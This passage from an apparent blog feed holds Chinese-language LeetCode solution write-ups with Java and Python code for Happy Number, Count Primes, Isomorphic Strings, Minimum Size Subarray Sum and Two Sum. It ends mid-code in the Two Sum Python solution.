<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line"></span><br><span class="line">11110</span><br><span class="line">11010</span><br><span class="line">11000</span><br><span class="line">00000</span><br><span class="line"></span><br><span class="line">Output: 1</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line"></span><br><span class="line">11000</span><br><span class="line">11000</span><br><span class="line">00100</span><br><span class="line">00011</span><br><span class="line"></span><br><span class="line">Output: 3</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目其实和Q130. Surrounded Regions一摸一样，换汤不换药，把字母O换成了1，仅此而已。省略吧，不写了。</p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Union Find </tag>
            
            <tag> Depth-First Search </tag>
            
            <tag> Breath-First Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[202. Happy Number]]></title>
      <url>/wiki/2017/10/10/Leetcode-202-Happy-Number/</url>
      <content type="html"><![CDATA[<p>Write an algorithm to determine if a number is “happy”.</p>
<p>A happy number is a number defined by the following process: Starting with any positive integer, replace the number by the sum of the squares of its digits, and repeat the process until the number equals 1 (where it will stay), or it loops endlessly in a cycle which does not include 1. Those numbers for which this process ends in 1 are happy numbers.</p>
<p>Example: </p>
<p>Input: 19<br>Output: true<br>Explanation: </p>
<p>1<sup>2</sup> + 9<sup>2</sup> = 82<br>8<sup>2</sup> + 2<sup>2</sup> = 68<br>6<sup>2</sup> + 8<sup>2</sup> = 100<br>1<sup>2</sup> + 0<sup>2</sup> + 0<sup>2</sup> = 1</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>直接采用题目所定义的Happy Number来写。采用HashSet判断重复。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isHappy</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    HashSet set = <span class="keyword">new</span> HashSet();</span><br><span class="line">    <span class="keyword">while</span> (n != <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!set.add(n)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">int</span> nt = n, digit;</span><br><span class="line">        n = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (nt != <span class="number">0</span>) &#123;</span><br><span class="line">            digit = nt % <span class="number">10</span>;</span><br><span class="line">            n += digit*digit;</span><br><span class="line">            nt /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Hash Table </tag>
            
            <tag> Math </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[204. Count Primes]]></title>
      <url>/wiki/2017/10/10/Leetcode-204-Count-Primes/</url>
      <content type="html"><![CDATA[<p>Count the number of prime numbers less than a non-negative number, $n$.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 10</span><br><span class="line">Output: 4</span><br><span class="line">Explanation: There are 4 prime numbers less than 10, they are 2, 3, 5, 7.</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>The Sieve of Eratosthenes is one of the most efficient ways to find all prime numbers up to $n$. </p>
<p>We start off with a table of $n$ numbers. Let’s look at the first number, 2. We know all multiples of 2 must not be primes, so we mark them off as non-primes. Then we look at the next number, 3. Similarly, all multiples of 3 such as 3 × 2 = 6, 3 × 3 = 9, … must not be primes, so we mark them off as well. Now we look at the next number, 4, which was already marked off. So we can skip 4 immediately and go to the next number, 5. Now, all multiples of 5 such as 5 × 2 = 10, 5 × 3 = 15, 5 × 4 = 20, 5 × 5 = 25, … can be marked off.</p>
<p>In fact, we can mark off multiples of 5 starting at 5 × 5 = 25, because 5 × 2 = 10 was already marked off by multiple of 2, similarly 5 × 3 = 15 was already marked off by multiple of 3. Therefore, if the current number is p, we can always mark off multiples of p starting at $p^2$, then in increments of p: $p^2 + p, p^2 + 2p$, … </p>
<p>The terminating loop condition can be $p &lt; \sqrt{n}$, as all non-primes $\ge \sqrt{n}$$ must have already been marked off. </p>
<p>The Sieve of Eratosthenes uses an extra $O(n)$ memory and its runtime complexity is $O(n \log<br>\log n)$. </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">countPrimes</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// boolean[] are initialed as false by default</span></span><br><span class="line">    <span class="keyword">boolean</span>[] notPrime = <span class="keyword">new</span> <span class="keyword">boolean</span>[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i*i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!notPrime[i]) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i*i; j &lt; n; j += i)</span><br><span class="line">                notPrime[j] = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">if</span> (!notPrime[i]) count++;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但其实Sieve of Eratosthenes方法并不快，虽然它的算法复杂度非常好。因为它反复需要计算乘积，对于整数来说，它的表示范围本来就很小，这种算法上的优化并没有什么用。反而下面的快一些，把判断条件改为$i&lt;n$。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">countPrimes</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span>[] notPrime = <span class="keyword">new</span> <span class="keyword">boolean</span>[n];</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (notPrime[i] == <span class="keyword">false</span>) &#123;</span><br><span class="line">            count++;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">2</span>*i; j &lt; n; j += i)</span><br><span class="line">                notPrime[j] = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Hash Table </tag>
            
            <tag> Math </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[205. Isomorphic Strings]]></title>
      <url>/wiki/2017/10/10/Leetcode-205-Isomorphic-Strings/</url>
      <content type="html"><![CDATA[<p>Given two strings <strong>s</strong> and <strong>t</strong>, determine if they are isomorphic.</p>
<p>Two strings are isomorphic if the characters in <strong>s</strong> can be replaced to get <strong>t</strong>.</p>
<p>All occurrences of a character must be replaced with another character while preserving the order of characters. No two characters may map to the same character but a character may map to itself.</p>
<p><strong>Example 1</strong>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: s = &quot;egg&quot;, t = &quot;add&quot;</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>
<p><strong>Example 2</strong>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: s = &quot;foo&quot;, t = &quot;bar&quot;</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>
<p><strong>Example 3</strong>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: s = &quot;paper&quot;, t = &quot;title&quot;</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>
<p><strong>Example 4</strong>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: s = &quot;aa&quot;, t = &quot;ab&quot;</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>
<p><strong>Note</strong>: You may assume both <strong>s</strong> and <strong>t</strong> have the same length.</p>
<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>确认字符串同构。这道题目最直接的方法是利用HashMap存放一一对应的字符。key-value之间的映射相当于字符之间的对应。当比较字符时，如果字符已经包括在Map中，则取出对应字符，对比是否相同；则否，尝试着存入字符，但字符不能已经包括在value中，不然就不是一一对应了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isIsomorphic</span><span class="params">(String s, String t)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s.length() != t.length()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (s.length() == <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    Map&lt;Character, Character&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">char</span> char1, char2;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">        char1 = s.charAt(i);</span><br><span class="line">        char2 = t.charAt(i);</span><br><span class="line">        <span class="comment">// 取出字符，对比</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(char1)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.get(char1) != char2)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 字符存在与value中吗？</span></span><br><span class="line">            <span class="keyword">if</span> (map.containsValue(char2))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="comment">// 放入字符对</span></span><br><span class="line">            map.put(char1, char2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是<code>map.containsValue()</code>方法是$O(n)$的，所以最坏情况下，<code>isIsomorphic()</code>需要$O(n^2)$的时间复杂度，还好总共只有26个字符，所以影响不大。如果要减少<code>map.containsValue()</code>方法对时间复杂度的影线，可以将value值单独放在HashSet中，实现常数时间的检索。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isIsomorphic</span><span class="params">(String s, String t)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s.length() != t.length()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (s.length() == <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    Map&lt;Character, Character&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    Set&lt;Character&gt; set = <span class="keyword">new</span> HashSet();</span><br><span class="line">    <span class="keyword">char</span> char1, char2;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">        char1 = s.charAt(i);</span><br><span class="line">        char2 = t.charAt(i);</span><br><span class="line">        <span class="comment">// 取出字符，对比</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(char1)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.get(char1) != char2)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 字符存在与value中吗？</span></span><br><span class="line">            <span class="keyword">if</span> (!set.add(char2))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="comment">// 放入字符对</span></span><br><span class="line">            map.put(char1, char2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>除了存储字符的一一对应关系，还有什么方法呢？一种更快的方法是存储字符的下标。如果字符一一对应，那么存储的字符的下标一定相同。当遇到下一对字符时，我们先比较这对字符的下标，如果不同，则肯定不是同形字符串。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isIsomorphic</span><span class="params">(String s, String t)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] m1 = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">128</span>], m2 = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">int</span> index1, index2;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">        index1 = s.charAt(i);</span><br><span class="line">        index2 = t.charAt(i);</span><br><span class="line">        <span class="keyword">if</span> (m1[index1] != m2[index2]) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        m1[index1] = i + <span class="number">1</span>;</span><br><span class="line">        m2[index2] = i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码用了巧妙的方法，使用数组代替哈希表直接存储字符下标。因为ascii字符只有256个，采用大小为256的数组可以代替哈希表：不仅存储及其方便，而且取值也非常快速。</p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Hash Table </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[209. Minimum Size Subarray Sum]]></title>
      <url>/wiki/2017/10/10/Leetcode-209-Minimum-Size-Subarray-Sum/</url>
      <content type="html"><![CDATA[<p>Given an array of $n$ positive integers and a positive integer $s$, find the minimal length of a <strong>contiguous</strong> subarray of which the sum $\ge s$. If there isn’t one, return 0 instead.</p>
<p>Example: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: s = 7, nums = [2, 3, 1, 2, 4, 3]</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: the subarray [4,3] has the minimal length under the problem constraint.</span><br></pre></td></tr></table></figure>
<p>Follow up: If you have figured out the $O(n)$ solution, try coding another solution of which the time complexity is $O(n \log n)$. </p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>使用滑动窗口的方法：使用左指针和右指针维持滑动窗口，右指针向右滑动，当滑动窗口表示的子数组的和大于等于$s$时，试图缩小窗口，知道子数组的和小于$s$。重复此过程，找到长度最小的滑动窗口。类似的题目可参照LeetCode 76. Minimum Window Substring。算法时间复杂度为$O(n)$。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minSubArrayLen</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span>[] nums)</span> </span>&#123;      </span><br><span class="line">    <span class="comment">// 左右指针</span></span><br><span class="line">    <span class="keyword">int</span> l = <span class="number">0</span>, r = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 数组的长度</span></span><br><span class="line">    <span class="keyword">int</span> n = nums.length;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 和大于等于s的最小子数组长度</span></span><br><span class="line">    <span class="keyword">int</span> minLength = n + <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 子数组的和</span></span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (r &lt; n) &#123;</span><br><span class="line">        <span class="comment">// 子数组的和加上当前数字</span></span><br><span class="line">        sum += nums[r];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 子数组的和大于等于s</span></span><br><span class="line">        <span class="keyword">while</span> (sum &gt;= s) &#123;</span><br><span class="line">            <span class="comment">// 如果该子数组的长度为最小, 更新最小长度</span></span><br><span class="line">            <span class="keyword">if</span> (r - l + <span class="number">1</span> &lt; minLength)</span><br><span class="line">                minLength = r - l + <span class="number">1</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 移动左指针, 并更新子数组的和</span></span><br><span class="line">            sum -= nums[l++];</span><br><span class="line">        &#125;</span><br><span class="line">        r++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> minLength &gt; n ? <span class="number">0</span> : minLength;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目还说了试着另一种时间复杂度为$O(n \log n)$的算法。一看到$O(n \log n)$的算法，可以想到二分查找。但是数组并不能排序，因为数字的顺序是题目的关键。那么怎么得到有序的数组呢？由于题目限制了所有的数字必须是正整数，所以累加和是有序的！一种巧妙的办法是将原数组<code>nums[i]</code>转换为前$i$个数字的和的数组<code>sums[i]</code>。因此一个子数组的和可以表示为两个累加和的差。这样给定子数组的起点，子数组的终点可以通过二分查找找到。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minSubArrayLen</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = nums.length;</span><br><span class="line">    <span class="keyword">int</span>[] sums = <span class="keyword">new</span> <span class="keyword">int</span>[n + <span class="number">1</span>];</span><br><span class="line">    <span class="comment">// sums[i]为nums中前i个数字的和</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        sums[i + <span class="number">1</span>] = sums[i] + nums[i];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 和大于等于s的最小子数组长度</span></span><br><span class="line">    <span class="keyword">int</span> minLength = n + <span class="number">1</span>;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> start = <span class="number">0</span>; start &lt; n; start++) &#123;</span><br><span class="line">        <span class="comment">// 以start为开始位置，在接下来的数组中，寻找和为sums[start] + s的值的位置</span></span><br><span class="line">        <span class="keyword">int</span> end = binarySearch(start + <span class="number">1</span>, n, sums[start] + s, sums);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 找不到，即使找遍所有的和。</span></span><br><span class="line">        <span class="comment">// 由于现在找不到，接下来start变大，寻找区间变小，更找不到了，所以停止搜索</span></span><br><span class="line">        <span class="keyword">if</span> (end &gt; n) <span class="keyword">break</span>; </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果该子数组的长度为最小, 更新最小长度</span></span><br><span class="line">        <span class="keyword">if</span> (minLength &gt;  end - start) minLength = end - start;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> minLength &gt; n ? <span class="number">0</span> : minLength;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">// 二分查找</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">binarySearch</span><span class="params">(<span class="keyword">int</span> lo, <span class="keyword">int</span> hi, <span class="keyword">int</span> key, <span class="keyword">int</span>[] keys)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (lo &gt; hi) <span class="keyword">return</span> lo;</span><br><span class="line">    <span class="keyword">int</span> mid = (lo + hi) / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> cmp = keys[mid] - key;</span><br><span class="line">    <span class="keyword">if</span> (cmp &lt; <span class="number">0</span>) <span class="keyword">return</span> binarySearch(mid + <span class="number">1</span>, hi, key, keys);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (cmp &gt; <span class="number">0</span>) <span class="keyword">return</span> binarySearch(lo, mid - <span class="number">1</span>, key, keys);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> mid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
            <tag> Two Pointers </tag>
            
            <tag> Binary Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[1. Two Sum]]></title>
      <url>/wiki/2017/10/10/Leetcode-1-Two-Sum/</url>
      <content type="html"><![CDATA[<p>Given an array of integers, return <strong>indices</strong> of the two numbers such that they add up to a specific target.</p>
<p>You may assume that each input would have <strong><em>exactly</em></strong> one solution, and you may not use the <em>same</em> element twice.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Given nums = [2, 7, 11, 15], target = 9,</span><br><span class="line">Because nums[0] + nums[1] = 2 + 7 = 9,</span><br><span class="line">return [0, 1].</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>使用哈希表，当遍历数组的时候，把数组元素的互补<code>target - nums[i]</code>和当前下标(<code>i</code>)插入到哈希表中，当数组元素已经存在于哈希表中时，说明找到了答案，返回哈希表值和当前下标。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Q1TwoSum</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.containsKey(nums[i])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;map.get(nums[i]), i&#125;;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// key, value pairs</span></span><br><span class="line">                map.put(target - nums[i], i); </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><p>hash。用一个哈希表，存储每个数对应的下标，复杂度$O(n)$</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twoSum</span><span class="params">(self, nums, target)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            <span 